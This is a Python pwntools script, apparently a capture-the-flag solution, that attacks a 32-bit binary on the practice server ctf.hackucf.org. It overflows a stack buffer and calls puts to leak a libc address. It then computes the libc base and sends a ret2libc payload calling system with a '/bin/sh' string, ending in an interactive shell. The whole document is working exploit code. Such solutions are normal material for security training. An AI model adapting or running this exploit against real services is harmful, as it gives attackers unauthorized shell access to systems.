from pwn import *

import sys

target = remote("ctf.hackucf.org", 9003)
#target = process("./chall-test_ret", env={"LD_PRELOAD":"./libc6_2.23-0ubuntu10_i386.so"})
#gdb.attach(target, gdbscript="verify_exploit")

payload = ""
payload += "0000000000000000000000000000000000000000000000000000000000000000"
payload += p32(0xdeadbeef)
payload += "000000000000"
payload += p32(0x80484b0)
payload += p32(0x8048699)
payload += p32(0x8049a1c)
target.sendline(payload)
leak = target.recv(4)
putsAddress = u32(leak)
libcBase = putsAddress - (392352)
print("libcBase is: %s" % hex(libcBase))
payload = ""
payload += "0000000000000000000000000000000000000000000000000000000000000000"
payload += p32(0xdeadbeef)
payload += "000000000000"
payload += p32(libcBase + 0x3ada0)
payload += "0000"
payload += p32(libcBase + 0x15ba0b)
target.sendline(payload)

target.interactive()
